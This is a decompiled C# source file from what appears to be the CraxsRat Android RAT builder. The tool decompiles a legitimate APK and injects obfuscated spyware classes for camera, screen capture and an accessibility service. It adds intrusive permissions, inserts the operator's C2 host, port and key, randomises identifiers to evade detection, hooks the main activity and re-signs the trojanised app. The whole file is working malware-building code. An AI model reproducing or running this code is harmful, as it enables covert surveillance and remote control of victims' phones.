			selectapkbtn.Text = Codes.Translate(selectapkbtn.Text, "en", "ar");
			addactiv.Text = Codes.Translate(addactiv.Text, "en", "ar");
			removeactiv.Text = Codes.Translate(removeactiv.Text, "en", "ar");
			Label6.Text = Codes.Translate(Label6.Text, "en", "ar");
			Button3.Text = "حقن";
			maintapcontrols.TabPages[0].Text = "الأتصال";
			maintapcontrols.TabPages[1].Text = "الهدف";
			maintapcontrols.TabPages[2].Text = "إعدادات";
			maintapcontrols.TabPages[3].Text = "بناء";
			checkkeepscreen.Text = "إبقاء الشاشة مضاءة";
		}
	}

	public object RandomShit(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 2;
				_0024STATIC_0024RandomShit_00242021C88_0024r = new Random();
			}
			else if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init);
			}
		}
		int num = _0024STATIC_0024RandomShit_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		checked
		{
			for (int i = 1; i <= num2; i++)
			{
				int startIndex = _0024STATIC_0024RandomShit_00242021C88_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			cou++;
			return stringBuilder.ToString() + Conversions.ToString(cou);
		}
	}

	private int GenerateRandomNumber(int m0, int m1)
	{
		if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, ref lockTaken);
			if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 0)
			{
				_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 2;
				_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number = new Random();
			}
			else if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init);
			}
		}
		return _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number.Next(m0, m1);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
		folderBrowserDialog.RootFolder = Environment.SpecialFolder.Desktop;
		folderBrowserDialog.SelectedPath = "C:\\";
		folderBrowserDialog.Description = "Select Path for Decompile Apk";
		if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
		{
			FolderPath.Text = folderBrowserDialog.SelectedPath;
			TheApkPath = FolderPath.Text;
		}
	}

	private void addactiv_click(object sender, EventArgs e)
	{
		string text = Conversions.ToString(5);
		if (FolderPath.Text != null)
		{
			text = FolderPath.Text;
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = text;
			openFileDialog.Multiselect = true;
			openFileDialog.DefaultExt = ".smali";
			openFileDialog.Title = "Select Path for Apk Activity to inject";
			string[] array = new string[3];
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			array = openFileDialog.FileNames;
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				string text3 = text2;
				if (text3.ToLower().EndsWith(".smali") && !Activlist.Items.Contains(text3.Replace(text, ">")))
				{
					Activlist.Items.Add(text3.Replace(text, ">"));
				}
			}
		}
		else
		{
			CraxsAlert.ShowWarning("Select Apk Folder First");
		}
	}

	private string D(string v)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(v));
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		log.Text = "";
		if (CheckAllValuse())
		{
			log.AppendText("Starting Injection...");
			Button3.Enabled = false;
			Startwork();
		}
		else
		{
			log.Text = "check values";
		}
	}

	private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
	{
		if (string.IsNullOrEmpty(e.Data))
		{
			return;
		}
		try
		{
			_Closure_0024__287_002D0 arg = default(_Closure_0024__287_002D0);
			_Closure_0024__287_002D0 CS_0024_003C_003E8__locals21 = new _Closure_0024__287_002D0(arg);
			CS_0024_003C_003E8__locals21._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals21._0024VB_0024Local_msg = e.Data;
			if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("java is not recognized"))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					log.AppendText(Environment.NewLine + "> Java not installed : go to google and install (java jdk)");
				}));
			}
			if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.StartsWith("I:"))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals21._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Replace("I:", "> "));
				}));
			}
			else if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("[PROTECT]") && !CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("Writing:"))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals21._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals21._0024VB_0024Local_msg);
				}));
			}
			else if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.StartsWith("E:"))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals21._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Replace("E:", "ERROR :"));
				}));
			}
			if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("[PROTECT] Saved to"))
			{
				protectfinished = true;
			}
			if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("Java(TM)") | CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("OpenJDK"))
			{
				if (!Once)
				{
					Once = true;
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						log.AppendText(Environment.NewLine + "> Extract New Data..");
					}));
					originalapkname = Path.GetFileName(TargetApktext.Text);
					File.Copy(TargetApktext.Text, WorkingDir + "\\temp.apk");
					File.WriteAllBytes(apktoolpath, Resources.apktool);
					File.WriteAllBytes(Apksignerpath, Resources.signapk);
					File.WriteAllBytes(ApkZIPpath, Resources.zipalign);
					File.WriteAllBytes(Apkeditorpath, Resources.APKEditor);
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						log.AppendText(Environment.NewLine + "> Decompile Apk Start..");
					}));
					ExecuteCommand("cd " + WorkingDir);
					ExecuteCommand("java -jar \"" + apktoolpath + "\" d -f \"" + apktemp + "\" -o \"" + TheApkPath + "\"");
				}
			}
			else if (CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("Copying original files"))
			{
				HoldMainThread = false;
			}
			else
			{
				if (!CS_0024_003C_003E8__locals21._0024VB_0024Local_msg.Contains("Built apk"))
				{
					return;
				}
				while (!File.Exists(outputapk))
				{
					Thread.Sleep(1000);
				}
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					log.AppendText(Environment.NewLine + "> Zip Align..");
				}));
				string command = ApkZIPpath + " 4 \"" + outputapk + "\" \"" + outputapk.Replace("Ready.apk", "Ready_zip.apk") + "\"";
				string text = outputapk.Replace("Ready.apk", "Ready_zip.apk");
				ExecuteCommand(command);
				while (!File.Exists(text))
				{
					Thread.Sleep(5000);
				}
				File.Delete(outputapk);
				if (checkprotector.Checked)
				{
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						log.AppendText(Environment.NewLine + "> Protect Apk..");
					}));
					string text2 = text.Replace(".apk", "_protected.apk");
					string command2 = "java -jar " + Apkeditorpath + " p  -i \"" + text + "\"";
					ExecuteCommand(command2);
					while (!File.Exists(text2) | !protectfinished)
					{
						Thread.Sleep(1000);
					}
					File.Delete(text);
					text = text2;
				}
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					log.AppendText(Environment.NewLine + "> Sign APK..");
				}));
				File.WriteAllBytes(WorkingDir + "\\certificate.pem", Resources.c);
				File.WriteAllBytes(WorkingDir + "\\key.pk8", Resources.k);
				string path = WorkingDir + "\\out\\" + originalapkname.Replace(".apk", "_Jected.apk");
				string command3 = "java -jar \"" + Apksignerpath + "\" sign --key " + WorkingDir + "\\key.pk8 --cert " + WorkingDir + "\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out \"" + WorkingDir + "\\out\\" + originalapkname.Replace(".apk", "_Jected.apk") + "\" \"" + text + "\"";
				ExecuteCommand(command3);
				while (!File.Exists(path))
				{
					Thread.Sleep(5000);
				}
				File.Delete(text);
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					log.AppendText(Environment.NewLine + "-----------Finished-------------" + Environment.NewLine + "> Host: " + Host.Text + Environment.NewLine + "> Port: " + Port.Text + Environment.NewLine + "> App: " + originalapkname.Replace(".apk", ""));
				}));
				int num = 1;
				do
				{
					Thread.Sleep(100);
					Application.DoEvents();
					num = checked(num + 1);
				}
				while (num <= 30);
				Process.Start(WorkingDir + "\\out");
				StopCommandPrompt();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			_Closure_0024__287_002D1 arg2 = default(_Closure_0024__287_002D1);
			_Closure_0024__287_002D1 CS_0024_003C_003E8__locals23 = new _Closure_0024__287_002D1(arg2);
			CS_0024_003C_003E8__locals23._0024VB_0024Me = this;
			Exception _0024VB_0024Local_ex = ex;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_ex = _0024VB_0024Local_ex;
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals23._0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + CS_0024_003C_003E8__locals23._0024VB_0024Local_ex.Message);
			}));
			ProjectData.ClearProjectError();
		}
	}

	private void StopCommandPrompt()
	{
		try
		{
			cmdProcess.CloseMainWindow();
			cmdProcess.Close();
			cmdProcess.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ExecuteCommand(string command)
	{
		cmdProcess.StandardInput.WriteLine(command);
		cmdProcess.StandardInput.Flush();
	}

	public void Startwork()
	{
		if (CheckAutomatic.Checked)
		{
			log.AppendText(Environment.NewLine + "> Automatic injection Started..");
			log.AppendText(Environment.NewLine + "> Preparation Started..");
			HoldMainThread = true;
			Codes.GetDriv();
			string text;
			try
			{
				text = Codes.GenerateRandomFolderName("jector");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				log.AppendText("Error Create Work Folder:" + ex2.Message);
				ProjectData.ClearProjectError();
				return;
			}
			WorkingDir = text;
			TheApkPath = WorkingDir + "\\temp";
			if (!Directory.Exists(TheApkPath))
			{
				Directory.CreateDirectory(TheApkPath);
			}
			cmdProcess = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			cmdProcess.EnableRaisingEvents = true;
			cmdProcess.StartInfo = processStartInfo;
			cmdProcess.OutputDataReceived += cmdOutputHandler;
			cmdProcess.ErrorDataReceived += cmdOutputHandler;
			cmdProcess.Start();
			cmdProcess.BeginOutputReadLine();
			cmdProcess.BeginErrorReadLine();
			apktemp = text + "\\temp.apk";
			apktoolpath = text + "\\apktool.jar";
			Apksignerpath = text + "\\signapk.jar";
			ApkZIPpath = text + "\\zipalign.exe";
			Apkeditorpath = text + "\\ApkEditor.jar";
			ExecuteCommand("java -version");
			do
			{
				Thread.Sleep(1);
				Application.DoEvents();
			}
			while (HoldMainThread);
		}
		else
		{
			log.AppendText(Environment.NewLine + "> Manually injection Started...");
		}
		log.AppendText(Environment.NewLine + "> Check Permissions...");
		while (Codes.FileInUse(TheApkPath + "\\AndroidManifest.xml") | !File.Exists(TheApkPath + "\\AndroidManifest.xml"))
		{
			Thread.Sleep(1000);
		}
		string text2 = UpdateVersions(File.ReadAllText(TheApkPath + "\\AndroidManifest.xml"));
		checked
		{
			try
			{
				if (!text2.ToLower().Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()))
				{
					need_write = true;
				}
				if (!text2.ToLower().Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()))
				{
					need_battery = true;
				}
				if (!text2.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
				{
					need_read = true;
				}
				if (!text2.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
				{
					need_forground = true;
				}
				if (!text2.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
				{
					need_syswinow = true;
				}
				if (!text2.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
				{
					need_boot = true;
				}
				if (Operators.CompareString(ComboPrims.Text, "Only Needed", TextCompare: false) != 0)
				{
					need_all = true;
					ASKPRIM_all = true;
					string[] array = Resources.ALLPRIM.Split('#');
					string[] array2 = array;
					foreach (string text3 in array2)
					{
						try
						{
							if (!string.IsNullOrEmpty(text3) && !text2.ToLower().Contains(text3.ToLower()))
							{
								ALLPRIMSLIST.Add(text3);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
				log.AppendText(Environment.NewLine + "> Coding AndroidManifest...");
				cou = GenerateRandomNumber(0, 5000);
				N_ClassGen = Conversions.ToString(RandommMad(25, 35));
				N_cap_sc_ = Conversions.ToString(RandommMad(25, 35));
				N__srv_worker_ = Conversions.ToString(RandommMad(25, 35));
				N_newEngineWorkerins = Conversions.ToString(RandommMad(25, 35));
				N__access_ask_ = Conversions.ToString(RandommMad(25, 35));
				N__ask_prim_ = Conversions.ToString(RandommMad(25, 35));
				N_update_app_ = Conversions.ToString(RandommMad(25, 35));
				N__scctrl_ = Conversions.ToString(RandommMad(25, 35));
				N_WackMeUpJob = Conversions.ToString(RandommMad(25, 35));
				N__ask_draw_ = Conversions.ToString(RandommMad(25, 35));
				N__ask_battary_ = Conversions.ToString(RandommMad(25, 35));
				N__CamActivity_ = Conversions.ToString(RandommMad(25, 35));
				N__SCRActivity_ = Conversions.ToString(RandommMad(25, 35));
				N__webviewer_ = Conversions.ToString(RandommMad(25, 35));
				if (checkkeepscreen.Checked)
				{
					KeepScreen = "on";
				}
				string[] array3 = File.ReadAllLines(TheApkPath + "\\AndroidManifest.xml");
				while (Codes.FileInUse(TheApkPath + "\\apktool.yml") | !File.Exists(TheApkPath + "\\apktool.yml"))
				{
					Thread.Sleep(1000);
				}
				string[] array4 = File.ReadAllLines(TheApkPath + "\\apktool.yml");
				int num = array4.Length - 1;
				for (int j = 0; j <= num; j++)
				{
					if (array4[j].ToLower().Contains("targetSdkVersion".ToLower()))
					{
						array4[j] = "  targetSdkVersion: '29'";
						File.WriteAllLines(TheApkPath + "\\apktool.yml", array4);
						break;
					}
				}
				int num2 = array3.Length - 1;
				for (int k = 1; k <= num2; k++)
				{
					if (need_write && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.WritePrim;
						need_write = false;
					}
					if (need_battery && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.batteryprim;
						need_battery = false;
					}
					if (need_read && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.ReadPrim;
						need_read = false;
					}
					if (need_forground && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.FORGROUD;
						need_forground = false;
					}
					if (need_syswinow && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.SystemwindowPrim;
						need_syswinow = false;
					}
					if (need_boot && array3[k].ToLower().Contains("<uses-permission"))
					{
						array3[k] = array3[k] + "\r\n" + Resources.BootPrim;
						need_boot = false;
					}
					if (need_all && array3[k].ToLower().Contains("<uses-permission"))
					{
						foreach (string item in ALLPRIMSLIST)
						{
							array3[k] = array3[k] + "\r\n" + item;
						}
						need_all = false;
					}
					if (array3[k].ToLower().Contains("<application"))
					{
						if (!array3[k].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
						{
							array3[k] = array3[k].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
						}
						array3[k] = array3[k] + Environment.NewLine + Resources.CypherMini.Replace("_ask_prim_", N__ask_prim_).Replace("_access_ask_", N__access_ask_).Replace("EngineWorkerins", N_newEngineWorkerins)
							.Replace("_srv_worker_", N__srv_worker_)
							.Replace("_cap_sc_", N_cap_sc_)
							.Replace("_update_app_", N_update_app_)
							.Replace("webviewer", N__webviewer_)
							.Replace("SCRActivity", N__SCRActivity_)
							.Replace("CamActivity", N__CamActivity_)
							.Replace("_ask_battary_", N__ask_battary_)
							.Replace("_scctrl_", N__scctrl_)
							.Replace("ClassGen", N_ClassGen)
							.Replace("_ask_draw_", N__ask_draw_)
							.Replace("WackMeUpJob", N_WackMeUpJob);
						break;
					}
				}
				File.WriteAllLines(TheApkPath + "\\AndroidManifest.xml", array3);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				log.AppendText("Error Manifest :" + ex4.Message);
				ProjectData.ClearProjectError();
			}
			string text4 = null;
			try
			{
				log.AppendText(Environment.NewLine + "> Inject Data To Apk...");
				int num3 = 2;
				do
				{
					if (Directory.Exists(TheApkPath + "\\smali_classes" + num3))
					{
						num3++;
						continue;
					}
					Directory.CreateDirectory(TheApkPath + "\\smali_classes" + num3);
					Directory.CreateDirectory(TheApkPath + "\\smali_classes" + num3 + "\\ginom\\alfa\\lib\\scan");
					text4 = TheApkPath + "\\smali_classes" + num3;
					break;
				}
				while (num3 <= 16);
				if (text4 == null)
				{
					Directory.CreateDirectory(TheApkPath + "\\smali_classes2");
					Directory.CreateDirectory(TheApkPath + "\\smali_classes2\\ginom\\alfa\\lib\\scan");
					text4 = TheApkPath + "\\smali_classes2";
				}
				if (!File.Exists(text4 + "\\data.zip"))
				{
					File.WriteAllBytes(text4 + "\\data.zip", Resources.APPS);
				}
				ZipFile.ExtractToDirectory(text4 + "\\data.zip", text4);
				File.Delete(text4 + "\\data.zip");
				Thread.Sleep(1);
				if (!Directory.Exists(TheApkPath + "\\res\\xml"))
				{
					Directory.CreateDirectory(TheApkPath + "\\res\\xml");
				}
				File.WriteAllText(TheApkPath + "\\res\\xml\\accessibilityprivatesrcapp.xml", Resources.accessibilityprivatesrcapp);
				if (!Directory.Exists(TheApkPath + "\\res\\xml"))
				{
					Directory.CreateDirectory(TheApkPath + "\\res\\xml");
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				log.AppendText("Error Data :" + ex6.Message);
				ProjectData.ClearProjectError();
			}
			try
			{
				log.AppendText(Environment.NewLine + "> Encryption...");
				string[] files = Directory.GetFiles(text4 + "\\ginom\\alfa\\lib\\scan");
				int minCharacters = 30;
				int maxCharacters = 35;
				newgetbyts = Conversions.ToString(RandomShit(30, 35));
				newsrvrun = Conversions.ToString(RandomShit(30, 35));
				split1 = Conversions.ToString(RandomShit(4, 4));
				split2 = Conversions.ToString(RandomShit(4, 4));
				split3 = Conversions.ToString(RandomShit(4, 4));
				split4 = Conversions.ToString(RandomShit(4, 4));
				newhost = Conversions.ToString(RandomShit(30, 35));
				newport = Conversions.ToString(RandomShit(30, 35));
				newkey = Conversions.ToString(RandomShit(30, 35));
				newalive = Conversions.ToString(RandomShit(30, 35));
				newname = Conversions.ToString(RandomShit(30, 35));
				neweco = Conversions.ToString(RandomShit(30, 35));
				newconect = Conversions.ToString(RandomShit(30, 35));
				newsokt = Conversions.ToString(RandomShit(30, 35));
				newstrtconct = Conversions.ToString(RandomShit(30, 35));
				newcnl = Conversions.ToString(RandomShit(30, 35));
				newcnm = Conversions.ToString(RandomShit(30, 35));
				newsndmthd = Conversions.ToString(RandomShit(30, 35));
				newplgs = Conversions.ToString(RandomShit(30, 35));
				NEWRANDOM = madladstr();
				newforuce = "QsdvgaerEARGar";
				string[] array5 = files;
				foreach (string path in array5)
				{
					string contents = File.ReadAllText(path).Replace("_ask_prim_", N__ask_prim_).Replace("_access_ask_", N__access_ask_)
						.Replace("EngineWorkerins", N_newEngineWorkerins)
						.Replace("_srv_worker_", N__srv_worker_)
						.Replace("_cap_sc_", N_cap_sc_)
						.Replace("_update_app_", N_update_app_)
						.Replace("webviewer", N__webviewer_)
						.Replace("SCRActivity", N__SCRActivity_)
						.Replace("CamActivity", N__CamActivity_)
						.Replace("_ask_battary_", N__ask_battary_)
						.Replace("_scctrl_", N__scctrl_)
						.Replace("ClassGen", N_ClassGen)
						.Replace("_METHOD_getbyte_", newgetbyts)
						.Replace("_mthd_issrvrun_", newsrvrun)
						.Replace("_splet_1_", split1)
						.Replace("_split_2_", split2)
						.Replace("_split_3_", split3)
						.Replace("_the_plugns_", newplgs)
						.Replace("_split_4_", split4)
						.Replace("_the_host_", newhost)
						.Replace(Decrypt("fhTUPYsif35OSfhZ0W7kaw==", TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(TheKey.Text)))
						.Replace(Decrypt("l47cEy4tX1IFMbXx/K/EjQ==", TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(Host.Text)))
						.Replace(Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(Port.Text)))
						.Replace("USE-SUPER", checksuper.Checked.ToString())
						.Replace("USE-NOKILL", checkkill.Checked.ToString())
						.Replace("USE-DRAWOVER", checkDraw.Checked.ToString())
						.Replace("USE-AUTOGRANT", checkautoclick.Checked.ToString())
						.Replace("USE-ALLPRIM", ASKPRIM_all.ToString())
						.Replace("fource.info", "false")
						.Replace("name.info", CLiname.Text)
						.Replace("_the_port_", newport)
						.Replace("_the_key_", newkey)
						.Replace("_the_alive_", newalive)
						.Replace("_usr_nam_", newname)
						.Replace("_the_eco_", neweco)
						.Replace("_C_N_L_", newcnl)
						.Replace("_c_N_M_", newcnm)
						.Replace("_NOTIFI_TITLE_", titletext.Text)
						.Replace("_NOTIFI_MSG_", msgtext.Text)
						.Replace("_send_mthd_", newsndmthd)
						.Replace("_the_fouce_", newsndmthd)
						.Replace("_the_fouce_", newforuce)
						.Replace("_the_sokt_", newsokt)
						.Replace("USE-SCREENON", KeepScreen)
						.Replace("payload", Conversions.ToString(RandomShit(minCharacters, maxCharacters)))
						.Replace("_start_connect_", newstrtconct)
						.Replace("_is_connected_", newconect)
						.Replace("[RANDOM-STRING]", NEWRANDOM)
						.Replace("_ask_draw_", N__ask_draw_)
						.Replace("WackMeUpJob", N_WackMeUpJob);
					File.WriteAllText(path, contents);
					Thread.Sleep(1);
				}
				string text5 = text4 + "\\ginom\\alfa\\lib\\scan";
				string searchPattern = "*.smali";
				int num4 = 0;
				string[] files2 = Directory.GetFiles(text5, searchPattern, SearchOption.AllDirectories);
				foreach (string text6 in files2)
				{
					if (text6.Contains("_ask_prim_") | text6.Equals("_ask_prim_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_ask_prim_", N__ask_prim_)));
					}
					if (text6.Contains("EngineWorkerins") | text6.Equals("EngineWorkerins"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("EngineWorkerins", N_newEngineWorkerins)));
					}
					if (text6.Contains("_access_ask_") | text6.Equals("_access_ask_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_access_ask_", N__access_ask_)));
					}
					if (text6.Contains("_srv_worker_") | text6.Equals("_srv_worker_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_srv_worker_", N__srv_worker_)));
					}
					if (text6.Contains("_cap_sc_") | text6.Equals("_cap_sc_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_cap_sc_", N_cap_sc_)));
					}
					if (text6.Contains("_ask_battary_") | text6.Equals("_ask_battary_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_ask_battary_", N__ask_battary_)));
					}
					if (text6.Contains("_update_app_") | text6.Equals("_update_app_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_update_app_", N_update_app_)));
					}
					if (text6.Contains("SCRActivity") | text6.Equals("SCRActivity"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("SCRActivity", N__SCRActivity_)));
					}
					if (text6.Contains("webviewer") | text6.Equals("webviewer"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("webviewer", N__webviewer_)));
					}
					if (text6.Contains("CamActivity") | text6.Equals("CamActivity"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("CamActivity", N__CamActivity_)));
					}
					if (text6.Contains("_scctrl_") | text6.Equals("_scctrl_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_scctrl_", N__scctrl_)));
					}
					if (text6.Contains("WackMeUpJob") | text6.Equals("WackMeUpJob"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("WackMeUpJob", N_WackMeUpJob)));
					}
					if (text6.Contains("_ask_draw_") | text6.Equals("_ask_draw_"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("_ask_draw_", N__ask_draw_)));
					}
					num4++;
					Thread.Sleep(1);
				}
				num4 = 0;
				string[] files3 = Directory.GetFiles(text5, searchPattern, SearchOption.AllDirectories);
				foreach (string text7 in files3)
				{
					if (text7.Contains("ClassGen"))
					{
						File.Move(Path.Combine(text5, text7), Path.Combine(text5, text7.Replace("ClassGen", N_ClassGen)));
					}
					num4++;
					Thread.Sleep(1);
				}
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				log.AppendText(Environment.NewLine + "Error : Encryption...\r\n" + ex8.Message);
				ProjectData.ClearProjectError();
			}
			log.AppendText(Environment.NewLine + "> Injecting Main Activity...");
			int num5 = 0;
			if (!CheckAutomatic.Checked)
			{
				string newValue = default(string);
				foreach (object item2 in Activlist.Items)
				{
					string text8 = Conversions.ToString(item2);
					try
					{
						text8 = text8.Replace(">", TheApkPath);
						if (File.Exists(text8))
						{
							string[] array6 = File.ReadAllLines(text8);
							int num6 = array6.Length - 1;
							for (int num7 = 0; num7 <= num6; num7++)
							{
								if (num7 == 0)
								{
									string[] array7 = array6[0].Split(' ');
									newValue = array7[array7.Length - 1];
								}
								if (array6[num7].Contains(Decrypt("XqgovOgiwNmuEisbFkaXwA==", TK)) && array6[num7].ToLower().StartsWith(".method".ToLower()))
								{
									array6[num7 + 1] = array6[num7 + 1] + Environment.NewLine + D(Resources.oncreatecode).Replace(D("W3RyZ3RtYWluXQ=="), newValue);
									array6[array6.Length - 1] = array6[array6.Length - 1] + Environment.NewLine + Environment.NewLine + D(Decrypt(Resources.MainMith, TK)).Replace(D("W3RyZ3RtYWluXQ=="), newValue).Replace("MainReflectorScan", N_ClassGen + "9").Replace("ClassGen", N_ClassGen);
									break;
								}
							}
							File.WriteAllLines(text8, array6);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					num5++;
				}
			}
			else
			{
				List<string> activityNames = Codes.GetActivityNames(TheApkPath + "\\AndroidManifest.xml", checkonlymain.Checked);
				string smaliFolderPath = "smali";
				string newValue2 = default(string);
				foreach (string item3 in activityNames)
				{
					string text9 = Codes.FindActivityInSmali(TheApkPath, item3, smaliFolderPath);
					if (Operators.CompareString(text9, "pass", TextCompare: false) == 0)
					{
						continue;
					}
					string[] array8 = File.ReadAllLines(text9);
					int num8 = array8.Length - 1;
					for (int num9 = 0; num9 <= num8; num9++)
					{
						if (num9 == 0)
						{
							string[] array9 = array8[0].Split(' ');
							newValue2 = array9[array9.Length - 1];
						}
						if (array8[num9].Contains(Decrypt("XqgovOgiwNmuEisbFkaXwA==", TK)) && array8[num9].ToLower().StartsWith(".method".ToLower()))
